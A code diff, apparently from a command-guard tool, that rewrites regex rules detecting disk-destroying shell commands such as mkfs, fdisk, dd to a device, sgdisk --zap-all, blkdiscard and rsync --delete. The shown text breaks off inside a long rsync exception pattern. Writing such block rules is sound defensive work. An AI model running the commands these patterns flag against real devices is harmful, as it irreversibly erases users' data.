@@ -274,13 +274,13 @@ export const GENERATED = {
 			description: "Formatting a device erases all data on it.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:mkfs(?:\\.\\w+)?|mke2fs|mkswap)\\s+(?:\\S+\\s+)*?(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)(?:mkfs(?:\.\w+)?|mke2fs|mkswap)\s+(?:\S+\s+)*?(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"(?:^|\\s)(?:mkfs\\.ext[2-4]|mke2fs|mkfs\\.xfs)\\s+(?:\\S+\\s+)*?-[nN](?:\\s|$)",
+						String.raw`(?:^|\s)(?:mkfs\.ext[2-4]|mke2fs|mkfs\.xfs)\s+(?:\S+\s+)*?-[nN](?:\s|$)`,
 				},
 			],
 		},
@@ -290,7 +290,7 @@ export const GENERATED = {
 			description: "Modifying disk partitions can erase all data on the disk.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)parted\\s+(?:\\S+\\s+)*?(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)parted\s+(?:\S+\s+)*?(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [
 				{
@@ -306,7 +306,7 @@ export const GENERATED = {
 			description: "Modifying disk partitions can erase all data on the disk.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)fdisk\\s+(?:\\S+\\s+)*?(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)fdisk\s+(?:\S+\s+)*?(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -316,7 +316,7 @@ export const GENERATED = {
 			description: "Modifying disk partitions can erase all data on the disk.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)sfdisk\\s+(?:\\S+\\s+)*?(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)sfdisk\s+(?:\S+\s+)*?(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -326,7 +326,7 @@ export const GENERATED = {
 			description: "Writing to a specific disk sector can corrupt data.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)dd\\s+.*(?:conv=notrunc|seek=\\d+|skip=\\d+).*of=(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)dd\s+.*(?:conv=notrunc|seek=\d+|skip=\d+).*of=(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -337,7 +337,7 @@ export const GENERATED = {
 				"Modifying GPT disk partitions can erase all data on the disk.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)gdisk\\s+(?:\\S+\\s+)*?(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)gdisk\s+(?:\S+\s+)*?(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -348,7 +348,7 @@ export const GENERATED = {
 				"This destroys the partition table of the disk (with --zap-all also the MBR); every partition on it becomes unreachable.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)sgdisk\\s+(?:\\S+\\s+)*?(?:--zap-all|--zap|--clear|-[a-zA-Z]*[Zzo][a-zA-Z]*)(?:\\s|$)",
+				String.raw`(?:^|\s)sgdisk\s+(?:\S+\s+)*?(?:--zap-all|--zap|--clear|-[a-zA-Z]*[Zzo][a-zA-Z]*)(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -359,7 +359,7 @@ export const GENERATED = {
 				"This discards every block of the device (TRIM): the data on it is gone at once and cannot be recovered.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)blkdiscard\\s+(?:\\S+\\s+)*?(\\/dev\\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\\/[^\\s/]+|dm-[0-9]+|mapper\\/[^\\s/]+|disk\\/by-[a-z-]+\\/[^\\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\\w.-]*\\/[\\w.+-]+))(?:\\s|$)",
+				String.raw`(?:^|\s)blkdiscard\s+(?:\S+\s+)*?(\/dev\/(?:[hsv]d[a-z]+[0-9]*|r?disk[0-9]+(?:s[0-9]+)*|xvd[a-z]+[0-9]*|mmcblk[0-9]+(?:p[0-9]+)?|nvme[0-9]+n[0-9]+(?:p[0-9]+)?|md[0-9]+(?:p[0-9]+)?|md\/[^\s/]+|dm-[0-9]+|mapper\/[^\s/]+|disk\/by-[a-z-]+\/[^\s/]+|loop[0-9]+(?:p[0-9]+)?|rbd[0-9]+|zd[0-9]+|[a-zA-Z][\w.-]*\/[\w.+-]+))(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -369,7 +369,7 @@ export const GENERATED = {
 			description:
 				"This erases the RAID superblock of the device: the array it belongs to can no longer be assembled from it.",
 			feed: "parsed",
-			regex: "(?:^|\\s)mdadm\\s+(?:\\S+\\s+)*?--zero-superblock(?:\\s|$)",
+			regex: String.raw`(?:^|\s)mdadm\s+(?:\S+\s+)*?--zero-superblock(?:\s|$)`,
 			flags: "",
 			filters: [],
 		},
@@ -380,7 +380,7 @@ export const GENERATED = {
 				"Re-reading the partition table can affect mounted partitions.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)partprobe\\s+.*(\\/dev\\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))",
+				String.raw`(?:^|\s)partprobe\s+.*(\/dev\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))`,
 			flags: "",
 			filters: [],
 		},
@@ -391,7 +391,7 @@ export const GENERATED = {
 				"Changing block device parameters can affect disk operations.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)blockdev\\s+.*(\\/dev\\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))",
+				String.raw`(?:^|\s)blockdev\s+.*(\/dev\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))`,
 			flags: "",
 			filters: [],
 		},
@@ -401,7 +401,7 @@ export const GENERATED = {
 			description: "Mounting a raw block device can affect system stability.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)mount\\s+.*(\\/dev\\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))",
+				String.raw`(?:^|\s)mount\s+.*(\/dev\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))`,
 			flags: "",
 			filters: [],
 		},
@@ -412,13 +412,13 @@ export const GENERATED = {
 				"Removing a logical volume, physical volume or volume group, or shrinking a logical volume, deletes its data.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:sudo\\s+)?(?:lvremove|pvremove|vgremove|lvreduce)\\s+(?:-[a-zA-Z]+\\s+)?(?:--[a-zA-Z-]+\\s+)?(?:\\/dev\\/(?:[hs]d[a-z]|mmcblk[0-9])|\\/dev\\/mapper\\/[^\\s]+|[^\\s]+)",
+				String.raw`(?:^|\s)(?:sudo\s+)?(?:lvremove|pvremove|vgremove|lvreduce)\s+(?:-[a-zA-Z]+\s+)?(?:--[a-zA-Z-]+\s+)?(?:\/dev\/(?:[hs]d[a-z]|mmcblk[0-9])|\/dev\/mapper\/[^\s]+|[^\s]+)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^(?:lvremove|vgremove|pvremove)(?:\\s+(?:--verbose|--force|--yes|--quiet|-[vfyq]+|[^-\\s]\\S*))*\\s+(?:--test|-[vfyq]*t[tvfyq]*)(?:\\s+(?:--test|--verbose|--force|--yes|--quiet|-[tvfyq]+|[^-\\s]\\S*))*$",
+						String.raw`^(?:lvremove|vgremove|pvremove)(?:\s+(?:--verbose|--force|--yes|--quiet|-[vfyq]+|[^-\s]\S*))*\s+(?:--test|-[vfyq]*t[tvfyq]*)(?:\s+(?:--test|--verbose|--force|--yes|--quiet|-[tvfyq]+|[^-\s]\S*))*$`,
 				},
 			],
 		},
@@ -429,7 +429,7 @@ export const GENERATED = {
 				"Dumping or restoring a raw filesystem device can affect system stability.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)(?:dump|restore)\\s+.*(\\/dev\\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))",
+				String.raw`(?:^|\s)(?:dump|restore)\s+.*(\/dev\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))`,
 			flags: "",
 			filters: [],
 		},
@@ -440,13 +440,13 @@ export const GENERATED = {
 				"Encrypting or reformatting a device with cryptsetup can make its data inaccessible.",
 			feed: "parsed",
 			regex:
-				"(?:^|\\s)cryptsetup\\s+.*(\\/dev\\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))",
+				String.raw`(?:^|\s)cryptsetup\s+.*(\/dev\/([hs]d[a-z]|mmcblk[0-9]|nvme[0-9]+n[0-9]+))`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^cryptsetup(?:\\s+(?:-v|--verbose|--debug))*\\s+(?:isLuks(?:\\s+(?:-v|--verbose|--debug))*\\s+[^-\\s]\\S*(?:\\s+(?:-v|--verbose|--debug))*|luksDump(?:\\s+(?:-v|--verbose|--debug|--dump-json-metadata))*\\s+[^-\\s]\\S*(?:\\s+(?:-v|--verbose|--debug|--dump-json-metadata))*)$",
+						String.raw`^cryptsetup(?:\s+(?:-v|--verbose|--debug))*\s+(?:isLuks(?:\s+(?:-v|--verbose|--debug))*\s+[^-\s]\S*(?:\s+(?:-v|--verbose|--debug))*|luksDump(?:\s+(?:-v|--verbose|--debug|--dump-json-metadata))*\s+[^-\s]\S*(?:\s+(?:-v|--verbose|--debug|--dump-json-metadata))*)$`,
 				},
 			],
 		},
@@ -456,13 +456,13 @@ export const GENERATED = {
 			description:
 				"Syncs with deletion — removes files at destination not present in source.",
 			feed: "parsed",
-			regex: "(?:^|\\s)rsync\\s+.*--delete(\\s|$)",
+			regex: String.raw`(?:^|\s)rsync\s+.*--delete(\s|$)`,
 			flags: "",
 			filters: [
 				{
 					type: "NotMatches",
 					value:
-						"^rsync\\s+(?:(?:(?:[^-\\s]\\S*|-[^-\\s]\\S*|--\\S+)\\s+)*?(?:[^-\\s]\\S*|-[^-\\sBefTM@]|-[^-\\s]\\S*[^\\sBefTM@]|--[^\\s=]+=\\S*|--(?:[^abcdefgilmoprstuwz\\s=][^\\s=]*|a(?:[^d\\s=][^\\s=]*|d(?:[^d\\s=][^\\s=]*|d(?:[^r\\s=][^\\s=]*|r(?:[^e\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^s\\s=][^\\s=]*|s(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|b(?:[^alw\\s=][^\\s=]*|a(?:[^c\\s=][^\\s=]*|c(?:[^k\\s=][^\\s=]*|k(?:[^u\\s=][^\\s=]*|u(?:[^p\\s=][^\\s=]*|p(?:[^\\-\\s=][^\\s=]*|-(?:[^d\\s=][^\\s=]*|d(?:[^i\\s=][^\\s=]*|i(?:[^r\\s=][^\\s=]*|r(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?|l(?:[^o\\s=][^\\s=]*|o(?:[^c\\s=][^\\s=]*|c(?:[^k\\s=][^\\s=]*|k(?:[^\\-\\s=][^\\s=]*|-(?:[^s\\s=][^\\s=]*|s(?:[^i\\s=][^\\s=]*|i(?:[^z\\s=][^\\s=]*|z(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?|w(?:[^l\\s=][^\\s=]*|l(?:[^i\\s=][^\\s=]*|i(?:[^m\\s=][^\\s=]*|m(?:[^i\\s=][^\\s=]*|i(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|c(?:[^cho\\s=][^\\s=]*|c(?:[^\\s=][^\\s=]*)|h(?:[^emo\\s=][^\\s=]*|e(?:[^c\\s=][^\\s=]*|c(?:[^k\\s=][^\\s=]*|k(?:[^s\\s=][^\\s=]*|s(?:[^u\\s=][^\\s=]*|u(?:[^m\\s=][^\\s=]*|m(?:[^\\-\\s=][^\\s=]*|-(?:[^cs\\s=][^\\s=]*|c(?:[^h\\s=][^\\s=]*|h(?:[^o\\s=][^\\s=]*|o(?:[^i\\s=][^\\s=]*|i(?:[^c\\s=][^\\s=]*|c(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?|s(?:[^e\\s=][^\\s=]*|e(?:[^e\\s=][^\\s=]*|e(?:[^d\\s=][^\\s=]*|d(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?|m(?:[^o\\s=][^\\s=]*|o(?:[^d\\s=][^\\s=]*|d(?:[^\\s=][^\\s=]*))?)?|o(?:[^w\\s=][^\\s=]*|w(?:[^n\\s=][^\\s=]*|n(?:[^\\s=][^\\s=]*))?)?)?|o(?:[^mnp\\s=][^\\s=]*|m(?:[^p\\s=][^\\s=]*|p(?:[^ar\\s=][^\\s=]*|a(?:[^r\\s=][^\\s=]*|r(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^d\\s=][^\\s=]*|d(?:[^e\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?|r(?:[^e\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^s\\s=][^\\s=]*|s(?:[^\\-\\s=][^\\s=]*|-(?:[^cl\\s=][^\\s=]*|c(?:[^h\\s=][^\\s=]*|h(?:[^o\\s=][^\\s=]*|o(?:[^i\\s=][^\\s=]*|i(?:[^c\\s=][^\\s=]*|c(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?|l(?:[^e\\s=][^\\s=]*|e(?:[^v\\s=][^\\s=]*|v(?:[^e\\s=][^\\s=]*|e(?:[^l\\s=][^\\s=]*|l(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?)?|n(?:[^ft\\s=][^\\s=]*|f(?:[^i\\s=][^\\s=]*|i(?:[^g\\s=][^\\s=]*|g(?:[^\\s=][^\\s=]*))?)?|t(?:[^i\\s=][^\\s=]*|i(?:[^m\\s=][^\\s=]*|m(?:[^e\\s=][^\\s=]*|e(?:[^o\\s=][^\\s=]*|o(?:[^u\\s=][^\\s=]*|u(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?|p(?:[^y\\s=][^\\s=]*|y(?:[^\\-\\s=][^\\s=]*|-(?:[^ad\\s=][^\\s=]*|a(?:[^s\\s=][^\\s=]*|s(?:[^\\s=][^\\s=]*))?|d(?:[^e\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?|d(?:[^ep\\s=][^\\s=]*|e(?:[^b\\s=][^\\s=]*|b(?:[^u\\s=][^\\s=]*|u(?:[^g\\s=][^\\s=]*|g(?:[^\\s=][^\\s=]*))?)?)?|p(?:[^a\\s=][^\\s=]*|a(?:[^r\\s=][^\\s=]*|r(?:[^a\\s=][^\\s=]*|a(?:[^m\\s=][^\\s=]*|m(?:[^\\s=][^\\s=]*))?)?)?)?)?|e(?:[^ax\\s=][^\\s=]*|a(?:[^r\\s=][^\\s=]*|r(?:[^l\\s=][^\\s=]*|l(?:[^y\\s=][^\\s=]*|y(?:[^\\-\\s=][^\\s=]*|-(?:[^i\\s=][^\\s=]*|i(?:[^n\\s=][^\\s=]*|n(?:[^p\\s=][^\\s=]*|p(?:[^u\\s=][^\\s=]*|u(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?|x(?:[^c\\s=][^\\s=]*|c(?:[^l\\s=][^\\s=]*|l(?:[^u\\s=][^\\s=]*|u(?:[^d\\s=][^\\s=]*|d(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^r\\s=][^\\s=]*|r(?:[^o\\s=][^\\s=]*|o(?:[^m\\s=][^\\s=]*|m(?:[^\\s=][^\\s=]*))?)?)?)?))?)?)?)?)?)?|f(?:[^i\\s=][^\\s=]*|i(?:[^l\\s=][^\\s=]*|l(?:[^et\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^\\-\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^r\\s=][^\\s=]*|r(?:[^o\\s=][^\\s=]*|o(?:[^m\\s=][^\\s=]*|m(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|t(?:[^e\\s=][^\\s=]*|e(?:[^r\\s=][^\\s=]*|r(?:[^\\s=][^\\s=]*))?)?)?)?)?|g(?:[^r\\s=][^\\s=]*|r(?:[^o\\s=][^\\s=]*|o(?:[^u\\s=][^\\s=]*|u(?:[^p\\s=][^\\s=]*|p(?:[^m\\s=][^\\s=]*|m(?:[^a\\s=][^\\s=]*|a(?:[^p\\s=][^\\s=]*|p(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?|i(?:[^cn\\s=][^\\s=]*|c(?:[^o\\s=][^\\s=]*|o(?:[^n\\s=][^\\s=]*|n(?:[^v\\s=][^\\s=]*|v(?:[^\\s=][^\\s=]*))?)?)?|n(?:[^cf\\s=][^\\s=]*|c(?:[^l\\s=][^\\s=]*|l(?:[^u\\s=][^\\s=]*|u(?:[^d\\s=][^\\s=]*|d(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^r\\s=][^\\s=]*|r(?:[^o\\s=][^\\s=]*|o(?:[^m\\s=][^\\s=]*|m(?:[^\\s=][^\\s=]*))?)?)?)?))?)?)?)?|f(?:[^o\\s=][^\\s=]*|o(?:[^\\s=][^\\s=]*))?)?)?|l(?:[^io\\s=][^\\s=]*|i(?:[^n\\s=][^\\s=]*|n(?:[^k\\s=][^\\s=]*|k(?:[^\\-\\s=][^\\s=]*|-(?:[^d\\s=][^\\s=]*|d(?:[^e\\s=][^\\s=]*|e(?:[^s\\s=][^\\s=]*|s(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?|o(?:[^g\\s=][^\\s=]*|g(?:[^\\-\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^io\\s=][^\\s=]*|i(?:[^l\\s=][^\\s=]*|l(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^o\\s=][^\\s=]*|o(?:[^r\\s=][^\\s=]*|r(?:[^m\\s=][^\\s=]*|m(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?))?)?|o(?:[^r\\s=][^\\s=]*|r(?:[^m\\s=][^\\s=]*|m(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?|m(?:[^aio\\s=][^\\s=]*|a(?:[^x\\s=][^\\s=]*|x(?:[^\\-\\s=][^\\s=]*|-(?:[^ads\\s=][^\\s=]*|a(?:[^l\\s=][^\\s=]*|l(?:[^l\\s=][^\\s=]*|l(?:[^o\\s=][^\\s=]*|o(?:[^c\\s=][^\\s=]*|c(?:[^\\s=][^\\s=]*))?)?)?)?|d(?:[^e\\s=][^\\s=]*|e(?:[^l\\s=][^\\s=]*|l(?:[^e\\s=][^\\s=]*|e(?:[^t\\s=][^\\s=]*|t(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?|s(?:[^i\\s=][^\\s=]*|i(?:[^z\\s=][^\\s=]*|z(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|i(?:[^n\\s=][^\\s=]*|n(?:[^\\-\\s=][^\\s=]*|-(?:[^s\\s=][^\\s=]*|s(?:[^i\\s=][^\\s=]*|i(?:[^z\\s=][^\\s=]*|z(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|o(?:[^d\\s=][^\\s=]*|d(?:[^i\\s=][^\\s=]*|i(?:[^f\\s=][^\\s=]*|f(?:[^y\\s=][^\\s=]*|y(?:[^\\-\\s=][^\\s=]*|-(?:[^w\\s=][^\\s=]*|w(?:[^i\\s=][^\\s=]*|i(?:[^n\\s=][^\\s=]*|n(?:[^d\\s=][^\\s=]*|d(?:[^o\\s=][^\\s=]*|o(?:[^w\\s=][^\\s=]*|w(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?)?)?|o(?:[^nu\\s=][^\\s=]*|n(?:[^l\\s=][^\\s=]*|l(?:[^y\\s=][^\\s=]*|y(?:[^\\-\\s=][^\\s=]*|-(?:[^w\\s=][^\\s=]*|w(?:[^r\\s=][^\\s=]*|r(?:[^i\\s=][^\\s=]*|i(?:[^t\\s=][^\\s=]*|t(?:[^e\\s=][^\\s=]*|e(?:[^\\-\\s=][^\\s=]*|-(?:[^b\\s=][^\\s=]*|b(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^c\\s=][^\\s=]*|c(?:[^h\\s=][^\\s=]*|h(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?)?)?)?)?|u(?:[^t\\s=][^\\s=]*|t(?:[^\\-b\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^o\\s=][^\\s=]*|o(?:[^r\\s=][^\\s=]*|r(?:[^m\\s=][^\\s=]*|m(?:[^a\\s=][^\\s=]*|a(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?)?)?)?)?|b(?:[^u\\s=][^\\s=]*|u(?:[^f\\s=][^\\s=]*|f(?:[^\\s=][^\\s=]*))?)?)?)?)?|p(?:[^aor\\s=][^\\s=]*|a(?:[^rs\\s=][^\\s=]*|r(?:[^t\\s=][^\\s=]*|t(?:[^i\\s=][^\\s=]*|i(?:[^a\\s=][^\\s=]*|a(?:[^l\\s=][^\\s=]*|l(?:[^\\-\\s=][^\\s=]*|-(?:[^d\\s=][^\\s=]*|d(?:[^i\\s=][^\\s=]*|i(?:[^r\\s=][^\\s=]*|r(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?|s(?:[^s\\s=][^\\s=]*|s(?:[^w\\s=][^\\s=]*|w(?:[^o\\s=][^\\s=]*|o(?:[^r\\s=][^\\s=]*|r(?:[^d\\s=][^\\s=]*|d(?:[^\\-\\s=][^\\s=]*|-(?:[^f\\s=][^\\s=]*|f(?:[^i\\s=][^\\s=]*|i(?:[^l\\s=][^\\s=]*|l(?:[^e\\s=][^\\s=]*|e(?:[^\\s=][^\\s=]*))?)?)?)?)?)?)?)?)?)?)?|o(?:[^r\\s=][^\\s=]*|r(?:[^t\\s=][^\\s=]*|t(?:[^\\s=][^\\s=]*))?)?|r(?:[^o\\s=][^\\s=]*|o(?:[^t\\s=][^\\s=]*|t(?:[^o\\s=][^\\s=]*|o(?:[^c\\s=][^\\s=]*|c(?:[^o\\s=